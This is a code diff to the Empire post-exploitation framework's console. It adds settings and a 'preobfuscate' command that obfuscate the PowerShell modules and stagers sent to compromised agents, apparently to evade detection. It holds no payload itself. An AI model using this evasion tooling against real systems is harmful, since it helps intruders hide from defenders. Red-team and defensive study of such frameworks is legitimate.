@@ -20,7 +20,7 @@ import hashlib
 import time
 # import traceback
 from pydispatch import dispatcher
-
+import fnmatch
 
 # Empire imports
 import helpers
@@ -73,7 +73,7 @@ class MainMenu(cmd.Cmd):
         self.conn = self.database_connect()
 
         # pull out some common configuration information
-        (self.installPath, self.stage0, self.stage1, self.stage2, self.ipWhiteList, self.ipBlackList) = helpers.get_config('install_path,stage0_uri,stage1_uri,stage2_uri,ip_whitelist,ip_blacklist')
+        (self.installPath, self.stage0, self.stage1, self.stage2, self.ipWhiteList, self.ipBlackList, self.obfuscate, self.obfuscateCommand) = helpers.get_config('install_path,stage0_uri,stage1_uri,stage2_uri,ip_whitelist,ip_blacklist,obfuscate,obfuscate_command')
 
         # instantiate the agents, listeners, and stagers objects
         self.agents = agents.Agents(self, args=args)
@@ -550,8 +550,19 @@ class MainMenu(cmd.Cmd):
                         print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                 else:
                     self.agents.ipBlackList = helpers.generate_ip_list(",".join(parts[1:]))
+            elif parts[0].lower() == "obfuscate":
+                if parts[1].lower() == "true":
+                    self.obfuscate = True
+                    print helpers.color("[*] Obfuscating all future powershell commands run on all agents.")
+                elif parts[1].lower() == "false":
+                    print helpers.color("[*] Future powershell command run on all agent will no longer be obfuscated.")
+                    self.obfuscate = False
+                else:
+                    print helpers.color("[!] Valid options for obfuscate are 'true' or 'false'")
+            elif parts[0].lower() == "obfuscate_command":
+                self.obfuscateCommand = parts[1]
             else:
-                print helpers.color("[!] Please choose 'ip_whitelist' or 'ip_blacklist'")
+                print helpers.color("[!] Please choose 'ip_whitelist', 'ip_blacklist', or 'obfuscate'")
 
 
     def do_reset(self, line):
@@ -570,7 +581,10 @@ class MainMenu(cmd.Cmd):
             print self.agents.ipWhiteList
         if line.strip().lower() == "ip_blacklist":
             print self.agents.ipBlackList
-
+        if line.strip().lower() == "obfuscate":
+            print self.obfuscate
+        if line.strip().lower() == "obfuscate_command":
+            print self.obfuscateCommand
 
     def do_load(self, line):
         "Loads Empire modules from a non-standard folder."
@@ -668,7 +682,50 @@ class MainMenu(cmd.Cmd):
         else:
             print helpers.color("[!] Please enter a valid agent name")
 
+    def do_preobfuscate(self, line):
+        "Preobfuscate powershell modules"
 
+        module = line.strip()
+
+        if module == "" or module == "all":
+            choice = raw_input(helpers.color("[>] Preobfuscate all powershell modules using obfuscation command: \"" + self.obfuscateCommand + "\"? This may take a substantial amount of time. [y/N] ", "red"))
+            if choice.lower() != "" and choice.lower()[0] == "y":
+                reobfuscate = False
+                choice = raw_input(helpers.color("[>] Force reobfuscation of previously obfuscated modules? [y/N] ", "red"))
+                if choice.lower() != "" and choice.lower()[0] == "y":
+                    reobfuscate = True
+                originalPath = self.installPath + 'data/module_source'
+                pattern = '*.ps1'
+                for root, dirs, files in os.walk(originalPath):
+                    for filename in fnmatch.filter(files, pattern):
+                        filePath = os.path.join(root, filename)
+                        obfuscatedFilePath = self.installPath + 'data/obfuscated_module_source' + filePath.split(originalPath)[-1]
+                        if not os.path.isfile(obfuscatedFilePath) or reobfuscate:
+                            (head, tail) = os.path.split(obfuscatedFilePath)
+                            if not os.path.exists(head):
+                                os.makedirs(head)
+                            print helpers.color("[*] Obfuscating " + filename + "...")
+                            fr = open(filePath, 'r')
+                            script = fr.read()
+                            fr.close()
+                            fw = open(obfuscatedFilePath, 'w')
+                            fw.write(helpers.obfuscate(script, self.installPath, obfuscationCommand=self.obfuscateCommand))
+                            fw.close()
+                        else:
+                            print helpers.color("[*] " + filename + " already obfuscated.")
+            print helpers.color("[*] Obfuscation complete.")
+        elif module not in self.modules.modules:
+           print helpers.color("[!] Error: invalid module")
+        else:
+            choice = raw_input(helpers.color("[>] Preobfuscate module? [y/N] ", "red"))
+            if choice.lower() != "" and choice.lower()[0] == "y":
+                reobfuscate = False
+                choice = raw_input(helpers.color("[>] Force reobfuscation if module has been previously obfuscated? [y/N] ", "red"))
+                if choice.lower() != "" and choice.lower()[0] == "y":
+                    reobfuscate = True
+                print helpers.color("[*] Obfuscating module: " + module + "...")
+                self.modules.modules[module].obfuscate(obfuscationCommand=self.obfuscateCommand, forceReobfuscation=reobfuscate)
+                print helpers.color("[*] Obfuscation complete.")
     def complete_usemodule(self, text, line, begidx, endidx):
         "Tab-complete an Empire PowerShell module path."
 
@@ -712,7 +769,7 @@ class MainMenu(cmd.Cmd):
     def complete_set(self, text, line, begidx, endidx):
         "Tab-complete a global option."
 
-        options = ["ip_whitelist", "ip_blacklist"]
+        options = ["ip_whitelist", "ip_blacklist", "obfuscate", "obfuscate_command"]
 
         if line.split(" ")[1].lower() in options:
             return helpers.complete_path(text, line, arg=True)
@@ -770,7 +827,7 @@ class AgentsMenu(cmd.Cmd):
         self.doc_header = 'Commands'
 
         # set the prompt text
-        self.prompt = '(Empire: ' + helpers.color("agents", color="blue") + ') > '
+        self.prompt = '(Empire: ' + helpers.color("agents", color="blue", prompt=True) + ') > '
 
         messages.display_agents(self.mainMenu.agents.get_agents())
 
@@ -1296,7 +1353,7 @@ class AgentMenu(cmd.Cmd):
         name = self.mainMenu.agents.get_agent_name(sessionID)
 
         # set the text prompt
-        self.prompt = '(Empire: ' + helpers.color(name, 'red') + ') > '
+        self.prompt = '(Empire: ' + helpers.color(name, 'red', prompt=True) + ') > '
 
         # agent commands that have opsec-safe alises in the agent code
         self.agentCommands = ["ls", "dir", "rm", "del", "cp", "copy", "pwd", "cat", "cd", "mkdir", "rmdir", "mv", "move", "ipconfig", "ifconfig", "route", "reboot", "restart", "shutdown", "ps", "tasklist", "getpid", "whoami", "getuid", "hostname"]
@@ -1423,7 +1480,7 @@ class AgentMenu(cmd.Cmd):
             # replace the old name with the new name
             result = self.mainMenu.agents.rename_agent(oldname, parts[0])
             if result:
-                self.prompt = "(Empire: " + helpers.color(parts[0], 'red') + ") > "
+                self.prompt = "(Empire: " + helpers.color(parts[0], 'red', prompt=True) + ") > "
         else:
             print helpers.color("[!] Please enter a new name for the agent")
 
@@ -2091,7 +2148,7 @@ class ListenerMenu(cmd.Cmd):
         self.options = self.mainMenu.listeners.get_listener_options()
 
         # set the prompt text
-        self.prompt = '(Empire: ' + helpers.color("listeners", color="blue") + ') > '
+        self.prompt = '(Empire: ' + helpers.color("listeners", color="blue", prompt=True) + ') > '
 
         # display all active listeners on menu startup
         messages.display_listeners(self.mainMenu.listeners.get_listeners())
@@ -2278,7 +2335,11 @@ class ListenerMenu(cmd.Cmd):
             stager = self.mainMenu.stagers.stagers["launcher"]
             stager.options['Listener']['Value'] = listenerID
             stager.options['Base64']['Value'] = "True"
-
+            if self.mainMenu.obfuscate:
+                stager.options['Obfuscate']['Value'] = "True"
+            else:
+                stager.options['Obfuscate']['Value'] = "False"
+            stager.options['ObfuscateCommand']['Value'] = self.mainMenu.obfuscateCommand
             # and generate the code
             print stager.generate()
         else:
@@ -2404,7 +2465,7 @@ class ModuleMenu(cmd.Cmd):
         self.module = self.mainMenu.modules.modules[moduleName]
 
         # set the prompt text
-        self.prompt = '(Empire: ' + helpers.color(self.moduleName, color="blue") + ') > '
+        self.prompt = '(Empire: ' + helpers.color(self.moduleName, color="blue", prompt=True) + ') > '
 
         # if this menu is being called from an agent menu
         if agent:
@@ -2600,7 +2661,7 @@ class ModuleMenu(cmd.Cmd):
             return
 
         agentName = self.module.options['Agent']['Value']
-        moduleData = self.module.generate()
+        moduleData = self.module.generate(self.mainMenu.obfuscate, self.mainMenu.obfuscateCommand)
 
         if not moduleData or moduleData == "":
             print helpers.color("[!] Error: module produced an empty script")
@@ -2791,7 +2852,7 @@ class StagerMenu(cmd.Cmd):
         self.stager = self.mainMenu.stagers.stagers[stagerName]
 
         # set the prompt text
-        self.prompt = '(Empire: ' + helpers.color("stager/" + self.stagerName, color="blue") + ') > '
+        self.prompt = '(Empire: ' + helpers.color("stager/" + self.stagerName, color="blue", prompt=True) + ') > '
 
         # if this menu is being called from an listener menu
         if listener:
@@ -2935,7 +2996,7 @@ class StagerMenu(cmd.Cmd):
         if 'OutFile' in self.stager.options:
             savePath = self.stager.options['OutFile']['Value']
 
-        if savePath != '':
+        if savePath != '' and stagerOutput != '':
             # make the base directory if it doesn't exist
             if not os.path.exists(os.path.dirname(savePath)) and os.path.dirname(savePath) != '':
                 os.makedirs(os.path.dirname(savePath))
